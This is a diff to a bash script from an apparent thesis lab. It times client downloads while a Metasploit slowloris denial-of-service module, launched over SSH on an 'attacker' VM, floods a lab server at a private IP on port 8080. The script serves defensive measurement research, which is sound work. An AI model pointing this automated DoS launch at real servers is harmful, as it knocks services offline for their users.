@@ -21,20 +21,75 @@
 
 #python ./teste.py
 
-collect_download_times() {
-    local N=$1
-    for ((i = 0; i  < N; i++)); do
-        whoami
-    done
-}
-
 # 0.
 readonly NUM_ITER=5
 firewall="iptables"
-# TODO: Definir ip de cliente, atacante e servidor como variáveis
+client_ip="192.168.165.5"
+server_ip="192.168.244.4"
+# tcc-client-vm, tcc-server-vm, tcc-attacker-vm, tcc-pfsense-vm
+
+client_collect_times() {
+    local N=$1
+    TIMEFORMAT=%R
+    for ((i = 0; i  < N; i++)); do
+        time wget -qO teste.html http://192.168.244.4:8080
+    done
+}
+
+collect_download_times() {
+    local filename=$1
+    ssh tcc-client-vm "$(declare -f client_collect_times); client_collect_times $NUM_ITER" > $filename 2>&1
+}
+
+attacker_start_attack() {
+    local attack=$1
+    local server_ip=$2
+    local script_path="/tmp/start_exploit.rc"
+    local pid_path="/tmp/exploit.pid"
+
+    #TODO: checar se os arquivos script_path e pid_path já existem
+
+    cat << EOF > "$script_path"
+    use $attack
+    set rhost $server_ip
+    set rport 8080
+    set sockets 800
+    exploit -q
+EOF
+    msfconsole -q -r $script_path > /dev/null 2>&1 &
+
+    echo $! > $pid_path
+    cat $pid_path
+}
+
+start_attack() {
+    local attack=$1
+    ssh tcc-attacker-vm "$(declare -f attacker_start_attack); attacker_start_attack $attack $server_ip"
+}
+
+attacker_stop_attack() {
+    local script_path="/tmp/start_exploit.rc"
+    local pid_path="/tmp/exploit.pid"
+
+    if [ -f $pid_path ]; then
+        local pid=$(cat $pid_path)
+        if ps -p $pid > /dev/null; then
+            kill -9 $pid
+        fi
+        rm -f $script_path
+        rm -f $pid_path
+    fi
+}
+
+stop_attack() {
+    ssh tcc-attacker-vm "$(declare -f attacker_stop_attack); attacker_stop_attack"
+}
 
 # 1.
     # TODO
 
 # 2.
-ssh tcc-client-vm "$(declare -f collect_download_times); collect_download_times $NUM_ITER"
+#collect_download_times output.txt
+start_attack "auxiliary/dos/http/slowloris"
+sleep 30
+stop_attack
